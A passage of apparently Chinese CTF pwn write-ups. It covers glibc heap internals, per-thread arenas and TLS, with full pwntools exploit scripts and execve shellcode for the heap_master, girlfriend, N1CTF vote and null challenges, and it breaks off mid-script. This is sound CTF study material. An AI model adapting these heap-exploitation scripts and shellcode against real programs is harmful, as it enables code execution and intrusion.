0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret rsp = [rdi+0xa0] ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。 rsi = [rdi+0x70] rdx = [rdi+0x88] rcx = [rdi+0x98] r8 = [rdi+0x28] r9 = [rdi+0x30] ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x2000)+p64(libcbase+libc.sym['mprotect'])) upgrade(0x1000+0x68,p64(mmap_addr+0x2000)+p64(0x1000)) #rdi rsi upgrade(0x1000+0x88,p64(7)) #rdx upgrade(0x2000,p64(mmap_addr+0x2008)+shellcode) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 总结：唉，其实一路看下来的话其实所谓的多解就是两种泄露方式和三四种劫持程序控制流的方式进行排列组合罢了，融会贯通了其实五种方法就是一种方法。 leak方式： 改写stdout流的关键字节，使flag过了检查f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，并且_IO_write_base!=_IO_write_ptr。 在我们可控的地址上劫持伪造stdout流。 modify方式： 改写dl_open_hook，获得一次任意地址call的机会，然后配合setcontext+53控制寄存器，在malloc或者free出错，调用malloc_printerr时会trigger。 改写_IO_list_all，伪造_IO_FIFE_plus结构体，将vtable改为_IO_str_jumps的地址，然后在_IO_str_overflow或者_IO_str_finish里进行劫持。（malloc printerr/exit()/main return-&gt;__libc_message-&gt;abort-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow/_IO_str_finish），需要过一系列fflush的检查，固定构造已经在前面给出。 改写global_max_fast，突破fastbinY[]的限制，像任意（几乎）地址写victim的地址，可以改写某个hook来进行进一步操作。 参考资料：深入分析 IO_FILE 与 Unosrtbin Largebin attack 的结合利用 starctf-heap_master题解–e3pem Startctf2019_Heap_master–n132 JarvisOJ Pwn Writeup–m4x Largebin学习–veritas501 global_max_fast学习–raycp 新手向——IO_file全流程浅析 (这篇文章里在分析_IO_str_overflow时有错误orz，可能会误导人。)]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>starCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程pwn学习与总结]]></title>
    <url>%2F2019%2F06%2F22%2F%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[因为近期为了获得参加暑假方班夏令营的资格去digapis的平台上刷题，有幸做到了T3LS大佬出的girlfriend这题，这题我做了很久orz，查了很多资料，出的很巧妙，也是我第一次碰到多线程的题目，又谷歌了一下，发现多线程的题目在高端局中出现的并不低。。。所以参考了一大波师傅们的blog加上好几天的谷歌，决定来总结一下。 对于ptmalloc2中多线程方面的知识：在早期的 Linux 里，dlmalloc被用做默认的内存分配器。但之后因为ptmalloc2添加了线程支持，ptmalloc2成为了Linux默认内存分配器。线程支持可帮助提升内存分配器以及应用程序的性能。在dlmalloc里，当两个线程同时调用malloc时，只有一个线程能进入到临界段，因为这里的free list是所有可用线程共用的。因此内存分配器要在多线程应用里耗费时间，从而导致性能降低。 ptmalloc2中，当多个线程同时调用malloc，内存会立即得到分配，因为每个线程有一个单独的arena，因此free list数据结构中（在ptmalloc2中是bins）保存的这些堆也是分开的。这种为每个线程分配一个单独的arena和free list数据结构（bins）的行为称为per thread arena。 两个基本函数：pthread_create所有线程都有一个线程号，也就是Thread ID。其类型为pthread_t。 通过创建线程，线程将会执行一个线程函数，该线程格式必须按照下面来声明： ​ void * Thread_Function(void *) 创建线程的函数如下： ​ int pthread_create(pthread_t *restrict thread，const pthread_attr_t *restrict attr，void *(*start_routine)(void*)，void *restrict arg)； 下面说明一下各个参数的含义： thread：所创建的线程号。（返回的进程号将储存在thread变量里。） attr：所创建的线程属性，这个之后会提一下。 start_routine：即将运行的线程函数。 arg：传递给线程函数的参数。 在编译的时候需要注意，由于线程创建函数不是linux默认的库，而在libpthread.so库中，所以在编译命令中需要将该库导入（-lpthread）。命令如下： gcc –o createthread –lpthread createthread.c 如果想传递参数给线程函数，可以通过其参数arg，其类型是void 。如果你需要传递多个参数的话，可以考虑将这些参数组成一个结构体来传递。另外，由于类型是void ，所以你的参数不可以被提前释放掉。 pthread_join如果你的主线程，也就是main函数执行的那个线程，在你其他县城推出之前就已经退出，那么带来的bug则不可估量。通过pthread_join函数会让主线程阻塞，直到所有线程都已经退出。 int pthread_join(pthread_t thread, void **value_ptr); thread：等待退出线程的线程号。 value_ptr：退出线程的返回值。 看一个demo: 1234567891011121314151617181920212223242526int main ()&#123; pthread_t thread1_id; pthread_t thread2_id; struct char_print_parms thread1_args; //多个变量用结构体传参 struct char_print_parms thread2_args; //同上 /* Create a new thread to print 30,000 x’s. */ thread1_args.character = ’x’; thread1_args.count = 30000; pthread_create (&amp;thread1_id, NULL, &amp;char_print, &amp;thread1_args); /* Create a new thread to print 20,000 o’s. */ thread2_args.character = ’o’; thread2_args.count = 20000; pthread_create (&amp;thread2_id, NULL, &amp;char_print, &amp;thread2_args); /* Make sure the first thread has finished. */ pthread_join (thread1_id, NULL); /* Make sure the second thread has finished. */ pthread_join (thread2_id, NULL); /* Now we can safely return. */ return 0;&#125; 下面说一下前面提到的线程属性。 在我们前面提到，可以通过pthread_join()函数来使主线程阻塞等待其他线程退出，这样主线程可以清理其他线程的环境。但是还有一些线程，更喜欢自己来清理退出的状态，他们也不愿意主线程调用pthread_join来等待他们。我们将这一类线程的属性称为detached。如果我们在调用pthread_create()函数的时候将属性设置为NULL，则表明我们希望所创建的线程采用默认的属性，也就是jionable。如果需要将属性设置为detached。 最后说一下线程的本质。其实在Linux中，新建的线程并不是在原先的进程中，而是系统通过一个系统调用clone()。该系统copy了一个和原先进程完全一样的进程，并在这个进程中执行线程函数。不过这个copy过程和fork不一样。copy后的进程和原先的进程共享了所有的变量，运行环境。这样，原先进程中的变量变动在copy后的进程中便能体现出来。这意味着线程可以改动全局变量而使主进程中某个条件成立。 一个线程创建前后的内存环境分析：一个demo:（来自于深入理解glibc-malloc） 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf("Before malloc in thread 1\n"); getchar(); char* addr = (char*) malloc(1000); printf("After malloc and before free in thread 1\n"); getchar(); free(addr); printf("After free in thread 1\n"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf("Welcome to per thread arena example::%d\n",getpid()); printf("Before malloc in main thread\n"); getchar(); addr = (char*) malloc(1000); printf("After malloc and before free in main thread\n"); getchar(); free(addr); printf("After free in main thread\n"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if (ret) &#123; printf("Thread creation error\n"); return -1; &#125; ret = pthread_join(t1, &amp;s); if (ret) &#123; printf("Thread join error\n"); return -1; &#125; return 0;&#125; 如果我们一步一步调试会发现： 当主线程用malloc(1000)向ptmalloc2申请内存时会系统调用brk，操作系统会给主线程分配132k/0x21000大小的heap区域，这块区域叫main arena。 主线程free()以后，这一块内存会放进main arena的bin中。 当创建线程之后，线程调用malloc(1000)时，malloc()会系统调用mmap()给线程分配132k/0x21000的heap区域，这块区域叫thread arena。（当申请的内存大小大于128k/0x20000时，无论是主线程还是线程都会系统调用mmap()分配内存。） 线程free()以后这一块内存会放进thread arena的bin中。 印证了上面所说：为每个线程分配一个单独的arena和free list数据结构（bins）。 Arena的数量限制arena的数量由系统的核数量决定。 32位系统：arena的数量 = 2 核的数量64位系统：arena的数量 = 8 核的数量 Multiple Arena(arena的空间复用)例如：一个多线程（主线程+7个用户线程）应用在一个单核的64位系统上运行，线程数&gt;8*核数，因此glibc malloc需要确保multiple arena能被线程共享。 主线程第一次调用malloc会创建main arena。 thread1和thread2第一次调用malloc，会分别为它们创建thread arena thread3第一次调用malloc不会创建arena，会尝试reuse已存在的arena（main arena或arena1或arena2） reuse：当循环可用的arena时，尝试lock arena如果lock成功，返回那个arena给用户如果没有空闲的arena，阻塞排队等待arena Multiple Heapsglibc malloc中有三种数据结构：heap_info Heap Header - 一个thread arena可以有multiple heaps，每个heap有自己的header。（每个thread arena一开始只有一个heap，当堆段空间用尽时，会有新的heap被mmap到这个arena中）malloc_state Arena Header - 一个thread arena的multiple heaps只有一个arena header。Arena header包含着bins，top chunk，last remainder chunk等信息。 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top;//此地址将被写入_IO_list_all /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; malloc_chunk Chunk Header - 一个heap根据用户请求被分成多个chunk，每个chunk有自己的header。 Main arena没有multiple heaps，因此没有heap_info结构。当main arena空间用尽时，sbrk创建的堆段会被增长（连续空间），直到它撞到内存映射段。和thread arena不同，main arena的arena header不是sbrk创建的堆段的一部分，它是一个全局变量，因此它在libc.so的数据段。 main arena和thread arena（单个堆段）thread arena（多个堆段） TLS：线程本地存储又叫线程局部存储，其英文为Thread Local Storage，简称TLS，看似一个很高大上的东西，其实就是线程私有的全局变量而已。 普通的全局变量在多线程中是共享的，一个线程对其进行了修改，所有线程都可以看到这个修改，而线程私有的全局变量与普通全局变量不同，线程私有全局变量是线程的私有财产，每个线程都有自己的一份副本，某个线程对其所做的修改只会修改到自己的副本，并不会修改到其它线程的副本。 下面用例子来说明一下多线程共享全局变量以及线程私有全局变量之间的差异，并对gcc的线程本地存储做一个简单的分析。 首先来看普通的全局变量 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;int g = 0; // 1，定义全局变量g并赋初值0void* start(void* arg)&#123; printf("start, g[%p] : %d\n", &amp;g, g); // 4，子线程中打印全局变量g的地址和值 g++; // 5，修改全局变量 return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; // 2，主线程给全局变量g赋值为100 pthread_create(&amp;tid, NULL, start, NULL); // 3， 创建子线程执行start()函数 pthread_join(tid, NULL); // 6，等待子线程运行结束 printf("main, g[%p] : %d\n", &amp;g, g); // 7，打印全局变量g的地址和值 return 0;&#125; 注释已经写的很清晰明了，我们的目的是看线程中的g++会不会影响我们最开始定义的全局变量g，输出结果为： xiaoxiaorenwu@ubuntu:~/study/c$ gcc thread.c -o thread -lpthreadxiaoxiaorenwu@ubuntu:~/study/c$ ./threadstart, g[0x601064] : 100main, g[0x601064] : 101 从输出结果我们可以看到，普通全局变量g在主线程和其他线程中储存地址都是一样的，任何一个线程都可以对这个全局变量进行读取和修改，实现了变量的共享。 了解了普通的全局变量之后我们再来看通过线程本地存储(TLS)实现的线程私有全局变量。这个程序与上面的程序几乎完全一样，唯一的差别就是在定义全局变量 g 时增加了 __thread关键字，这样g就变成了线程私有全局变量了。 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;__thread int g = 0; // 1，这里增加了__thread关键字，把g定义成私有的全局变量，每个线程都有一个g变量void* start(void* arg)&#123; printf("start, g[%p] : %d\n", &amp;g, g); // 4，打印本线程私有全局变量g的地址和值 g++; // 5，修改本线程私有全局变量g的值 return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; // 2，主线程给私有全局变量赋值为100 pthread_create(&amp;tid, NULL, start, NULL); // 3，创建子线程执行start()函数 pthread_join(tid, NULL); // 6，等待子线程运行结束 printf("main, g[%p] : %d\n", &amp;g, g); // 7，打印主线程的私有全局变量g的地址和值 return 0;&#125; 输出结果为： xiaoxiaorenwu@ubuntu:~/study/c$ gcc -g thread.c -o thread -lpthreadxiaoxiaorenwu@ubuntu:~/study/c$ ./threadstart, g[0x7f0181b046fc] : 0main, g[0x7f01823076fc] : 100 我们可以发现两个问题，一个是g这个全局变量在主线程和其他线程中的地址不一样了，还有就是线程中对g进行修改并不能影响主线程中的g（这不是废话么。。。地址都不一样。。），说明每个线程都有一个自己私有的全局变量g。 我们来用gdb分析一下： 首先在源代码的第20行（对应到源代码中的 g = 100）处下一个断点，然后运行程序，程序停在了断点处，反汇编一下main函数： 12345678910111213141516171819202122232425262728293031323334(gdb) b thread.c:20Breakpoint1at0x400793:filethread.c, line 20.(gdb) rStartingprogram:/home/bobo/study/c/threadBreakpoint1, at thread.c:2020 g=100;(gdb) disassDumpofassemblercodeforfunctionmain: 0x0000000000400775&lt;+0&gt;:push %rbp 0x0000000000400776&lt;+1&gt;:mov %rsp,%rbp 0x0000000000400779&lt;+4&gt;:sub $0x20,%rsp 0x000000000040077d&lt;+8&gt;:mov %edi,-0x14(%rbp) 0x0000000000400780&lt;+11&gt;:mov %rsi,-0x20(%rbp) 0x0000000000400784&lt;+15&gt;:mov %fs:0x28,%rax 0x000000000040078d&lt;+24&gt;:mov %rax,-0x8(%rbp) 0x0000000000400791&lt;+28&gt;:xor %eax,%eax=&gt; 0x0000000000400793 &lt;+30&gt;:movl $0x64,%fs:0xfffffffffffffffc 0x000000000040079f&lt;+42&gt;:lea -0x10(%rbp),%rax 0x00000000004007a3&lt;+46&gt;:mov $0x0,%ecx 0x00000000004007a8&lt;+51&gt;:mov $0x400736,%edx 0x00000000004007ad&lt;+56&gt;:mov $0x0,%esi 0x00000000004007b2&lt;+61&gt;:mov %rax,%rdi 0x00000000004007b5&lt;+64&gt;:callq 0x4005e0 &lt;pthread_create@plt&gt; 0x00000000004007ba&lt;+69&gt;:mov -0x10(%rbp),%rax 0x00000000004007be&lt;+73&gt;:mov $0x0,%esi 0x00000000004007c3&lt;+78&gt;:mov %rax,%rdi 0x00000000004007c6&lt;+81&gt;:callq 0x400620 &lt;pthread_join@plt&gt; 0x00000000004007cb&lt;+86&gt;:mov %fs:0xfffffffffffffffc,%eax 0x00000000004007d3&lt;+94&gt;:mov %eax,%esi 0x00000000004007d5&lt;+96&gt;:mov $0x4008df,%edi 0x00000000004007da&lt;+101&gt;:mov $0x0,%eax 0x00000000004007df&lt;+106&gt;:callq 0x400600 &lt;printf@plt&gt; ...... 程序停在了g = 100这一行，看一下汇编指令， 1=&gt; 0x0000000000400793 &lt;+30&gt;:movl $0x64,%fs:0xfffffffffffffffc 这句汇编指令的意思是把常量100(0x64)复制到地址为%fs:0xfffffffffffffffc的内存中，可以看出全局变量g的地址为%fs:0xfffffffffffffffc，fs是段寄存器，0xfffffffffffffffc是有符号数-4，所以全局变量g的地址为： fs段基址 - 4 前面我们在讲段寄存器时说过段基址就是段的起始地址，为了验证g的地址确实是fs段基址 - 4，我们需要知道fs段基址是多少，虽然我们可以用gdb命令查看fs寄存器的值，但fs寄存器里面存放的是段选择子（segment selector）而不是该段的起始地址，为了拿到这个基地址，我们需要加一点代码来获取它，修改后的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;asm/prctl.h&gt;#include &lt;sys/prctl.h&gt;__thread int g = 0;void print_fs_base()&#123; unsigned long addr; int ret = arch_prctl(ARCH_GET_FS, &amp;addr); //获取fs段基地址 if (ret &lt; 0) &#123; perror("error"); return; &#125; printf("fs base addr: %p\n", (void*)addr); //打印fs段基址 return;&#125;void* start(void* arg)&#123; print_fs_base(); //子线程打印fs段基地址 printf("start, g[%p] : %d\n", &amp;g, g); g++; return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; pthread_create(&amp;tid, NULL, start, NULL); pthread_join(tid, NULL); print_fs_base(); //main线程打印fs段基址 printf("main, g[%p] : %d\n", &amp;g, g); return 0;&#125; 代码中主线程和子线程都分别调用了print_fs_base()函数用于打印fs段基地址，运行程序看一下： fs base addr: 0x7f36757c8700start, g[0x7f36757c86fc] : 0fs base addr: 0x7f3675fcb700main, g[0x7f3675fcb6fc] : 100 可以看到： 子线程fs段基地址为0x7f36757c8700，g的地址为0x7f36757c86fc，它正好是基地址 - 4 主线程fs段基地址为0x7f3675fcb700，g的地址为0x7f3675fcb6fc，它也是基地址 - 4 由此可以得出，gcc编译器（其实还有线程库以及内核的支持）使用了CPU的fs段寄存器来实现线程本地存储，不同的线程中fs段基地址是不一样的，这样看似同一个全局变量但在不同线程中却拥有不同的内存地址，实现了线程私有的全局变量。 了解了这么多，我们可以开始着手开始解决girlfriend了 ps：出了girlfriend，还是没有girlfriend（&gt; _&lt;）。。。。 girlfriend:题目：girlfriend 程序分析：emmm，首先看到这道题和平常的套路菜单题不同，五个选项从名字并看不出什么端倪。。。。还是静下心一个一个慢慢分析吧orz。。。。 begin函数:我们可以看到在begin函数中，每次选项之后都会经过一个if语句来判断是否创建线程，创建的线程数所依据的invite_num现在还未知，创建以后，主线程会申请一个0x30的chunk，每个线程中也会创建0x30的chunk，且他们都保存在girlfriend_chat_list中，然后我们发现主线程会sleep一段时间，这个时间似乎可以由我们掌控（猜一下啦），这个时间可以用来让我们选择是将主线程的堆指针放到girfriend_chat_list的最后（设置的足够长，等所有线程malloc完主线程再malloc），还是第一位（设置为0），这一点在之后是很关键的一步。 personal_info函数:当name_status大于0时（在begin里实现这个），将会启用一个格式化字符串漏洞（前提是name可控的话）。 chat函数:让我们在girl_chat_list中选一个chunk然后可以溢出8字节，不过这8字节的位置在chunk的地址的0x30之后。看似似乎并没有什么作用。。。继续看吧 make_appointment函数：在这个函数中，我们可以控制invite_num，也就是线程数，和主线程的sleep的时间，并开启一个begin函数中的if语句中的状态变量。而且还可以输入name，不过。。。不过。只有四个字节orz（%k&amp;p，k&lt;=9），这就很操蛋，因为64位的格式化字符串实际上从6才开始，到9就结束的话可以泄露的范围很小。。。 let_go函数：let_go函数里有两个状态，一个第一次调用时先定一个闹钟，这个闹钟就是每个线程的sleep时间，之后再调用的话就会又有三个分选项（第三个算是隐藏选项，其中有一个off-by-one漏洞，但是其需要通过一个if条件语句才能开启。），其余两个功能就是new与delete的常规操作，不过在new里，我们发现一个不起眼的地方，就是watch movie这里，感觉这里出的莫名其妙。。。干啥用的？？后来发现是一个任意地址溢出漏洞，不过只能加一次，且只能加一。先放这里吧。 这道题信息量比较大，题目先后关联比较紧密，如果没有把程序完全看懂的话很难做出来，甚至连思路都没有。 我们来仔细分析一下： 首先我们可以先调用make_appointment和let_go使name_status变为1，利用格式化字符串泄露信息，但是调试发现只能泄露出程序基址，无法泄露libc。 想利用off-by-one但是if条件过不了，寻找能使if条件中变量值改变的函数，发现在start_routine中，使 (signed int)__readfsdword(0xFFFFFFFC) &gt; 1即可，由题目之前介绍的知识可知，这个位置方法是线程私有变量，所以只要有一个线程实现这个使key等于1就行了，但是调试发现这个位置始终为1，且没有函数能让其变化。。思路陷入死胡同。。。 怎样泄露libc也没有头绪。那个溢出似乎能派上用场，但其只能溢出线程和主线程的topchunk的前八个字节啊。。。 movie的不起眼小功能还不知道怎么用。。。。 这个时候我们就需要上网查阅资料。。。终于想到可以利用arena的复用，申请九个thread，然后最后一个线程和主线程共用一个arena，然后用chat函数溢出最后一个线程，更改主线程chunk中的name指针为puts函数地址，泄露libc！！！！ 然后然后利用watch movie的任意地址加一，使某一个线程的FS：0xFFFFFFC加一变为2，通过start_routine的if检查，使key变为1，开启off-by-one，最后实现overlapping，然后为所欲为，拿到shell。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']p = process('./girlfriend')#p = remote('47.92.28.22',30499)P = ELF('./girlfriend')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def make(name): p.recvuntil('&gt;&gt; \n') p.sendline('3') p.recvuntil('invite?\n') p.sendline('9') p.recvuntil('name: ') p.send(name) p.recvuntil('When: ') p.sendline('4.0')def let_go1(): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home?\n') p.sendline('3.0') def let_go2(choice,size,to,content,flag = 0): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home\n') p.sendline(str(choice)) p.recvuntil('have\n') p.sendline(str(size)) if flag == 0: p.recvuntil('movie: ') p.sendline(str(to)) p.recvuntil('something: ') p.send(content)def delete(index): p.recvuntil('&gt;&gt; \n') p.sendline('5') p.recvuntil('home\n') p.sendline('2') p.recvuntil('byebye:') p.sendline(str(index))def chat(index,size,content): p.recvuntil('&gt;&gt; \n') p.sendline('2') p.recvuntil('girl: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)#----------------------first.leak program base addr---------------make('%9$p')let_go1()p.recvuntil('&gt;&gt; \n')p.sendline('1')base_addr = int(p.recv(14),16)-0x1ea5log.success('base_addr = '+hex(base_addr))#----------------------first success------------------------------#---------------second.overflow and leak libc----------------chat(8,0x30,'\x00'*0x40+p64(base_addr+P.got['puts']))#gdb.attach(p)p.recvuntil('&gt;&gt; \n')p.sendline('1')libcbase = u64(p.recv(6).ljust(8,'\x00'))-libc.sym['puts']log.success('libcbase = '+hex(libcbase))#--------------second success-------------------------------#--------------third.add key-----------------------------#gdb.attach(p,'b *base_addr+0x1813')to = (libcbase-(0x7ffff77f0000-0x7ffff77ef6fc) - (base_addr+0x6760))/4let_go2(1,0x10,to,'\x44'*0x10)sleep(1) #不要忘记!!!!#-------------third success------------------------------let_go2(1,0xf0,0,'\x44'*0xf0,1)let_go2(1,0xf0,0,'\x44'*0xf0,1) #2let_go2(1,0x60,0,'\x44'*0x60,1) #3let_go2(1,0x60,0,'\x44'*0x60,1) #4let_go2(1,0xf0,0,'\x44'*0xf0,1) #5let_go2(1,0xa20,0,'\x44'*0xa20,1) #6p.recvuntil('&gt;&gt; \n')p.sendline('5')p.recvuntil('home\n')p.sendline('3')p.recvuntil('Index: ')p.sendline('4')p.recvuntil('size: ')p.sendline(str(0x60))p.recvuntil('Content: ')payload = '\x44'*0x58+p64(0x1e0)+'\x00'p.send(payload)delete(3)delete(2)delete(5)let_go2(1,0xe0,0,'\x44'*0xe0,1) #7payload = libcbase+(0x7f35b1799b20-0x7f35b13d5000)-0x33let_go2(1,0x20,0,p64(0x71)+p64(payload)+p64(0)*2,1) #8one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]let_go2(1,0x60,0,'\x44'*0x60,1) #9let_go2(1,0x60,0,'\x44'*11+p64(libcbase+one_gadget[2]),1) #10delete(10)p.interactive() 反思与需要注意的细节：在设置主线程和分线程的sleep时间时，我们要一定要注意了，main_thread的sleep时间一定要充足，不要太短，两三秒差不多，不要设0.5秒这种。。因为太短的话不一定能使所有的thread的malloc申请完，不一定能使第九个thread的chunk位于main_thread的chunk上方，也就无法泄露。 线程的sleep时间比main_therad的sleep时间长一秒钟即可，这一秒种是让主线程有充足的时间利用watch movie功能的任意地址加一漏洞使某一个线程的fs:0xffffffc加一，在exp中也最好也等待1秒钟，看到程序输出Now you have a girlfriend再继续往下进行，防止数据错乱。 2018_N1CTF_vote:题目：vote和null 题目分析：由题目放进ida里，观察程序我们可发现这是一个投票的程序，然后在堆里会建一个竞选选手结构体，装有count（所获票数），time（当前时间）和name（我们自己可控），最多可建16个，所以我们可以大致猜到，这题的count和time是用来干扰我们控制伪造chunk的fd和bk指针用的，然后我们若选择投票功能，主线程会创建一个子线程，然后在子线程里会sleep三秒钟，之后会在投票池投最新的竞选选手一票。（这里有个条件竞争的漏洞，或者说需要避免的地方，就是如果先投了一个选手，在三秒内再投了另外一个选手，前一个线程中的指针会被第二个线程篡改，就等于给第二个选手投了两票，我们需要避免这一点），然后在cancel功能里有一个uaf漏洞（保证这个uaf漏洞可以trigger的条件是要避免出现前面所说的条件竞争，且不能给我们要cancel的选手投票。） 利用这个uaf可以直接泄露libcbase，然后我们发现vote功能可以给已经free的chunk投票，且投票不限次数，所以我们想到可以用对已经放入fastbin的chunk进行多次vote来modify其fd指针（常规的fastbin_attack），使其指向我们伪造的一个fastbin_chunk（可以用name来构造）。然后劫持到main_arena-0x33，然后改malloc_hook为one_gadget，后利用malloc_printerr触发，getshell!!!!!! exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *debug=0elf = ELF('./4')if debug: p= process('./4') context.log_level = 'debug' context.terminal = ['terminator','-x','sh','-c'] libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("47.92.28.22",30529) libc = ELF('./libc.so.6')def add(size,name): p.recvuntil('Action:') p.sendline('0') p.recvuntil('size') p.sendline(str(size)) p.recvuntil('name:') p.send(name)def show(index): p.recvuntil('Action:') p.sendline('1') p.recvuntil('index') p.sendline(str(index))def vote(index): p.recvuntil('Action:') p.sendline('2') p.recvuntil('index') p.sendline(str(index)) def cancel(index): p.recvuntil('Action:') p.sendline('4') p.recvuntil('index') p.sendline(str(index)) name = '\x44'*0x80add(0x80,name) #0add(0x80,'\x44'*0x80) #1cancel(0)show(0)p.recvuntil('count: ')libcbase = int(p.recvuntil('\n'),10) - (0x7f68b6a05b78-0x7f68b6641000)log.success('libcbase = '+hex(libcbase))add(0x80,'\x44'*0x80) #2add(0x50,'\x44'*0x50) #3name = p64(0) + p64(0x71) + p64(libcbase+0x7f0e8c25eb20-0x7f0e8be9a000-0x33) add(0x50,name+'\n') #4cancel(4)cancel(3)for i in range(0x20): vote(3)sleep(4)'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]add(0x50,'\x44'*0x50)add(0x50,'\x44'*0x50)add(0x50,'\x00'*3+p64(libcbase+one_gadget[2])+'\n')cancel(7)#gdb.attach(p)p.interactive() 2018_N1CTF_null:程序分析与漏洞挖掘：这道题又触及到了我的一块知识盲区，就是threads的malloc_state和heap_info结构体的内容以及他们在内存中的地址，和一个read()函数的溢出漏洞。 程序逻辑很简单，就是输入一段密码然后程序会创建一个线程。 然后在线程中可以进行不限次数和size最大为0x4000的malloc，并在最后一个malloc里可以填充数据，在这里我们仔细观察的话可以发现一个溢出漏洞，第一次不read满的话，第二次还能继续read。 调试发现，线程的chunk会申请在线程的堆块区，然后再这个堆块区的首位先是heap_info结构体（一个堆块区一个，每个堆块区的heap_info结构体之间用链表相连，且他们都保存了malloc_state的地址），然后紧接着是malloc_state结构体（一个线程只有一个），之后会一直往后申请，继续调试发现当我们把当前堆块区填满时，操作系统会在当前堆块区地址之前（和之前那个不相邻）再次分配一块堆块区，且大小为（每一块大小为0x4000000），这时候我们继续申请消耗堆块区空间，当这一块堆空间又被消耗完时，操作系统又会在其后分配一块新的堆空间，我们调试发现第三块的尾部就是初始堆块区的头部。 当继续消耗堆空间使第三块快耗尽时，我们利用溢出进行fastbinattack攻击（因为第一个堆块区的首部是malloc_state结构体），将0x70size的chunk劫持到bss段上（利用stdout流的首字节为0x7f），然后输入’/bin/sh\x00’字符串，并且将函数指针改为system的地址，然后当程序调用函数指针时就会打开shell。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.log_level = 'debug' p = process('./null_')p.recvuntil('password: \n')p.send("i'm ready for challenge\n")for i in range(12): p.recvuntil('Action: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(0x4000)) p.recvuntil('blocks: ') p.sendline('1000') p.recvuntil('(0/1): ') p.sendline('1') p.recvuntil('Input: ') payload = '\x44'*0x4000 p.send(payload)p.recvuntil('Action: ')p.sendline('1')p.recvuntil('Size: ')p.sendline(str(0x4000))p.recvuntil('blocks: ')p.sendline('262')p.recvuntil('(0/1): ')p.sendline('1')p.recvuntil('Input: ')payload = '\x44'*0x3000p.send(payload)payload = '\x44'*0x1020 + p64(0)*10 + 